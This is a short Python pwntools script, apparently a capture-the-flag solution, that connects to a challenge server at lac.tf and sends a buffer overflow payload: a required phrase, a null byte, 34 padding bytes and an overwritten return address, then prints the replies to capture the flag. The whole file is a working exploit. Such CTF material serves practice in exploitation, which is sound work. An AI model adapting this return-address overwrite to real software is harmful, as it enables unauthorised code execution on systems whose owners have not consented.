from pwn import *

exploit = b'please please please give me the flag' + \
    b'\x00' + \
    b'A'*34 + \
    b'\x8e\x12\x40\x00\x00\x00\x00\x00'

p = remote('lac.tf', 31180)
print(p.recv())
p.sendline(exploit)
print(p.recv())
print(p.recv())
print(p.recv())
